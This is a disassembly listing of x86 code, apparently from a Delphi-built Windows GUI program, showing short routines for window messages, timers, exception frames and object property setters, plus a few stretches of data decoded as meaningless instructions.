call sub_45cbd4
sub_45d304
jmp sub_4038bc
sub_45d348
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45d360
push ebx
mov ebx eax
mov eax ebx
call sub_421188
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45d3b2
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_45cbd4
sub_45d428
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45d571
jmp sub_4038bc
sub_45d578
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45d7b8
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45d7c8
sub_45d81c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_45d82c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_45d83c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_45d84c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_45d85c
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_45d8d4
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_459c1c
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_459c1c
retn
sub_45d8f0
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_459c1c
sub_45d938
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_45cb8c
retn
mov eax edx
retn
sub_45d972
jmp sub_403608
sub_45d977
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_469620
call sub_403970
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45dcdd
jmp sub_4038bc
sub_45dce4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403128
retn
sub_45dcfa
jmp sub_4038bc
sub_45ddfb
jmp sub_4038bc
sub_45de02
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45de1f
mov eax [ ebp - 0x14 ]
call sub_403128
retn
sub_45de18
jmp sub_4038bc
sub_45de3d
jmp sub_4038bc
sub_45dec7
jmp sub_4038bc
sub_45dece
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45df00
push ebx
mov ebx eax
mov eax ebx
call sub_41889c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_421f4c
sub_45dfc4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45dfd8
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45dfe0
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_45e3a5
jmp sub_4038bc
sub_45e3ac
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45e3de
dec eax
add [ ebp + edi * 4 - 0x3f3fffb8 ] dh
dec eax
add [ eax + 0x580048bd ] dh
retn 0x48
sub_45e4ac
jmp sub_4038bc
sub_45e4b3
pop ebp
retn
sub_45f02b
[ edi + edi * 8 - 0x2f002f ]
sub_45f032
stc
jmp esp
sub_4602f4
mov eax [ rw-data ]
retn
sub_4602fc
mov [ rw-data ] eax
retn
sub_460444
jmp sub_403608
sub_46047b
jmp sub_4038bc
sub_460482
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460650
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421ddc
pop ebp
retn 0x8
sub_460664
call sub_421e74
retn
sub_4607c6
jmp sub_4038bc
sub_4607cd
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_460871
jmp sub_4038bc
sub_460878
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460908
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_461034
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4616e0
sub_461050
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_461034
sub_461170
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4616e0
sub_461188
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4616e0
sub_4611a0
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_4616e0
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4611cc
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_4611d8
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_4616e0
retn
sub_4614b8
push ebx
mov ebx edx
mov edx ebx
call sub_44c664
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_461528
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_461650
jmp sub_4038bc
sub_461657
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461660
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_460a6c
mov eax [ ebx + 0x20c ]
call sub_460a6c
sub_4616c0
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4616d0
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4617cb
jmp sub_4038bc
sub_4617d8
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_4617f0
sub_461a0c
retn
sub_461a7a
jmp sub_4038bc
sub_461ab9
jmp sub_4038bc
sub_461aec
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44db5c
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_460cf8
retn
sub_461b10
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44db7c
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_460cf8
retn
sub_461c05
jmp sub_4038bc
sub_461c0c
mov eax [ ebp - 0x4 ]
call sub_44fadc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_460960
mov eax [ ebp - 0x4 ]
call sub_4616e0
sub_461d40
jmp sub_4038bc
sub_461d78
jmp sub_4038bc
sub_461d7f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461d9f
lea eax [ ebp - 0x114 ]
call sub_403eb8
retn
sub_461d98
jmp sub_4038bc
sub_461d9f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4620a6
jmp sub_4038bc
sub_4620ad
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034dc
sub_462101
jmp sub_403608
sub_46217d
jmp sub_403608
sub_462182
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_469620
call sub_403970
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46253a
jmp sub_4038bc
sub_462541
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46261c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cf8c
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_462634
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46266c
mov edx eax
mov eax esi
call sub_41f1a4
pop esi
pop ebx
retn
sub_462650
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_463a10
mov edx eax
mov eax esi
call sub_41f1a4
pop esi
pop ebx
retn
sub_46266c
push ebx
mov ebx eax
mov eax ebx
call sub_4636b0
mov edx r-xdata
call sub_4250d8
pop ebx
retn
sub_462770
push ebx
mov ebx eax
mov eax ebx
call sub_462780
xor al 0x1
pop ebx
retn
sub_462780
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4627dc
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_4627fc
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_46281c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_462b15
jmp sub_4038bc
sub_462b1c
pop ecx
pop ebp
retn
sub_462b20
xor eax eax
retn
sub_462df8
jmp sub_4038bc
sub_462dff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_462e15
jmp sub_4038bc
sub_462eff
jmp sub_4038bc
sub_462f06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f23
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub_462f1c
jmp sub_4038bc
sub_462f43
jmp sub_4038bc
sub_46322e
jmp sub_4038bc
sub_4633c1
jmp sub_4038bc
sub_4636b0
mov eax [ eax + 0x238 ]
retn
sub_4636b8
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4636c4
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_463a02
jmp sub_4038bc
sub_463a09
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463a10
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_463a58
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44cd78
sub_463a74
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_463ab0
push ebx
mov ebx eax
mov eax ebx
call sub_44ed0c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_424a38
sub_463b34
push ebx
mov ebx eax
mov eax ebx
call sub_44ed34
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_42517c
sub_463b54
push ebx
mov ebx eax
mov eax ebx
call sub_463774
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_46383c
pop ebx
retn
sub_464381
lea eax [ ebp - 0xb4 ]
call sub_403eb8
retn
sub_46438d
jmp sub_4038bc
j_sub_464381
jmp sub_464381
sub_464394
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4644ec
jmp sub_4038bc
sub_4644f3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4647d8
jmp sub_4038bc
sub_4647df
mov eax [ rw-data ]
call sub_467090
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4647f6
add [ eax ] al
retn
sub_464a54
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_464a74
mov eax [ eax + 0x240 ]
call sub_42b0e8
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_468ed4
sub_464b1b
jmp sub_4038bc
sub_464b22
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464b45
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_425154
retn
sub_464b3e
jmp sub_4038bc
sub_464b45
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464d04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_464a74
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_464f6c
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_45cd40
sub_465057
jmp sub_4038bc
sub_46505e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465064
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_46484c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_4650bc
call sub_465de4
retn
sub_465509
jmp sub_4038bc
sub_465510
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46580c
jmp sub_403608
sub_465ba8
jmp sub_403608
sub_465ca1
jmp sub_4038bc
sub_465ca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465cc5
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_465cbe
jmp sub_4038bc
sub_465cc5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465ccc
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_42b0e8
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_462714
sub_465cec
call sub_403128
retn
sub_465d44
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_465daa
jmp sub_4038bc
sub_465f58
jmp sub_403608
sub_465f84
xor edx edx
call sub_462a78
retn
sub_465f8c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_462a78
mov eax ebx
call sub_44920c
pop ebx
retn
sub_466012
jmp sub_4038bc
sub_466019
pop ebx
pop ecx
pop ebp
retn
sub_466020
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_44f7d8
push eax
call PostMessageA
pop ebx
retn
sub_466224
jmp sub_4038bc
sub_4662c5
jmp sub_4038bc
sub_4662cf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4662ee
mov eax [ rw-data ]
call sub_4685ac
retn
sub_4662e7
jmp sub_4038bc
sub_4662ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46630b
lea eax [ ebp - 0x20 ]
call sub_403eb8
retn
sub_466304
jmp sub_4038bc
sub_46630b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4663ec
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_448390
retn
mov edx eax
mov eax [ rw-data ]
call sub_467ba4
retn
sub_466770
mov edx eax
mov eax [ rw-data ]
call sub_469620
mov al 0x1
retn
sub_466858
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_466780
sub_46686c
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_466780
sub_466880
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_466780
sub_466894
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_466780
sub_4668a8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_466a13
jmp sub_4038bc
sub_466a1a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466a20
push ebx
mov ebx eax
mov eax ebx
call sub_44e0f0
mov eax ebx
call sub_44e274
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_466020
sub_466c96
jmp sub_4038bc
sub_466c9d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466ca4
push ebx
mov ebx edx
mov edx ebx
call sub_44e558
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_448498
pop ebx
retn
sub_466d10
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_466d60
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_466d2c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_466d60
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_466fe0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_466fec
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_466ff8
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_467004
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_467010
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46701c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46703c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_467058
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418700
pop esi
pop ebx
retn
sub_46706c
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_467074
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418700
pop esi
pop ebx
retn
sub_467088
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_467164
mov eax [ eax + 0x54 ]
call sub_4185a4
retn
sub_467170
mov eax [ eax + 0x54 ]
call sub_41889c
retn
sub_46740b
jmp sub_4038bc
sub_46744f
jmp sub_4038bc
sub_467456
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4674a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4672a4
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403f0c
pop esi
pop ebx
retn
sub_467510
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_418700
pop esi
pop ebx
retn
sub_467524
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_467729
jmp sub_4038bc
sub_467730
pop ebx
mov esp ebp
pop ebp
retn
sub_467738
inc [ eax + 0x8c ]
retn
sub_467740
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_467760
sub_467760
xor edx edx
call sub_467ba4
retn
sub_467b96
jmp sub_4038bc
sub_467c1d
jmp sub_4038bc
sub_467c2c
add eax 0x30
call sub_40d31c
retn
sub_467c70
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_467cc1
jmp sub_403608
sub_467cc6
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_469620
call sub_403970
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4683f1
jmp sub_4038bc
sub_4683f8
pop ebx
mov esp ebp
pop ebp
retn
sub_468580
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4685ac
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4685d8
xor edx edx
call sub_4684d0
retn
sub_4685e0
mov dl 0x1
call sub_4684d0
retn
sub_468654
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_46866c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_468739
jmp sub_4038bc
sub_468740
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403608#9
jmp sub_403608
sub_469488
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_403608#8
jmp sub_403608
j_sub_403608#7
jmp sub_403608
sub_4695fe
jmp sub_4038bc
sub_469605
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46960c
call sub_40ce6c
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_469805
jmp sub_4038bc
sub_46980c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4698d3
jmp sub_4038bc
sub_4698da
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469ab0
jmp sub_4038bc
sub_469ab7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469b18
jmp sub_4038bc
sub_469b1f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_469b28
call sub_4698f0
retn
j_sub_403608#6
jmp sub_403608
sub_469d6c
jmp sub_4038bc
sub_469d73
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469ea1
jmp sub_4038bc
sub_46a000
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_46a2ff
jmp sub_4038bc
sub_46a32e
jmp sub_4038bc
sub_46a43a
jmp sub_4038bc
sub_46a441
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46a7d2
jmp sub_4038bc
sub_46a7d9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a8fc
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46a947
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46a958
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46a968
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_46a9db
jmp sub_4038bc
sub_46a9e2
pop ebp
retn
sub_46a9e4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46a978
call sub_403c8c
call sub_46a8fc
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_4605d0
call sub_418068
sub_46b73c
jmp sub_4038bc
sub_46b771
jmp sub_4038bc
sub_46b778
pop ebp
retn
sub_46bc04
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_46bdd8
jmp sub_4038bc
sub_46c0b9
jmp sub_4038bc
sub_46c0c0
pop ebp
retn
sub_46c0c4
sub [ rw-data ] 0x1
retn
sub_46c0f9
jmp sub_4038bc
sub_46c100
pop ebp
retn
sub_46c104
sub [ rw-data ] 0x1
retn
sub_46c5d9
jmp sub_4038bc
sub_46c5e0
pop ebp
retn
sub_46c5e4
sub [ rw-data ] 0x1
retn
sub_46cabe
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
int3
sub_46cc00
inc esp
fld [ esi ]
hlt
sub_46cdb8
0xcbffdeff 0xff
sub_46d08e
inc edi
add al bh
les eax [ edi ]
int3
sub_46d096
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x70 ] 0xc00047d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x7c ] 0x140047e3
rol [ edi ] 0xf8
rol [ edi ] 0xa4
rol [ edi ] 0xa4
retn 0x47
sub_46d1e4
push ebx
mov ebx eax
mov eax ebx
call sub_480724
mov edx [ ebx + 0x48 ]
inc edx
mov eax ebx
call sub_448740
pop ebx
retn
sub_46d1fc
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax ebx
call sub_47efd8
pop ebx
retn
sub_46d214
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46d78c
mov edx esi
mov eax ebx
call sub_44aba4
pop esi
pop ebx
retn
sub_46d38c
xor eax eax
retn
sub_46d74c
push esi
mov esi eax
cmp dl [ esi + 0x1ae ]
je r-xdata
pop esi
retn
mov [ esi + 0x1ae ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46d7d4
push esi
mov esi eax
mov eax esi
call sub_44a6d0
cmp [ esi + 0x1a9 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403324
sub_46d7f4
push ebx
mov ebx eax
mov eax ebx
call sub_480048
mov edx 0x4
mov eax ebx
call sub_480010
pop ebx
retn
sub_46d864
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_46d930
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_46d950
push ebx
mov ebx eax
mov eax ebx
call sub_46d28c
cmp [ ebx + 0x1cc ] 0x0
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax [ ebx + 0x1b8 ]
call sub_433a38
sub_46d974
push ebx
mov ebx eax
mov eax ebx
call sub_46d2d0
xor edx edx
mov eax [ ebx + 0x1b8 ]
call sub_433a38
pop ebx
retn
sub_46db18
push esi
mov esi eax
cmp edx [ esi + 0x1b0 ]
je r-xdata
pop esi
retn
mov [ esi + 0x1b0 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46db34
push esi
mov esi eax
cmp dl [ esi + 0x1cd ]
je r-xdata
pop esi
retn
mov [ esi + 0x1cd ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46db50
push esi
mov esi eax
cmp dl [ esi + 0x1b4 ]
je r-xdata
pop esi
retn
mov [ esi + 0x1b4 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46dd04
push ebx
mov ebx eax
mov eax ebx
call sub_46d1e4
mov edx [ ebx + 0x48 ]
add edx 0x9
mov eax ebx
call sub_448740
pop ebx
retn
sub_46dd44
push ebx
mov ebx eax
mov eax ebx
call sub_46d2d0
mov [ ebx + 0x1b0 ] 0x0
pop ebx
retn
sub_46de97
jmp sub_4038bc
sub_46de9e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46debb
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_46deb4
jmp sub_4038bc
sub_46debb
mov esp ebp
pop ebp
retn
sub_46e000
push esi
mov eax [ eax + 0x2a0 ]
mov si 0xffed
call sub_403324
pop esi
retn
sub_46e014
push ebx
mov ebx edx
mov edx ebx
call sub_44a090
mov edx [ ebx ]
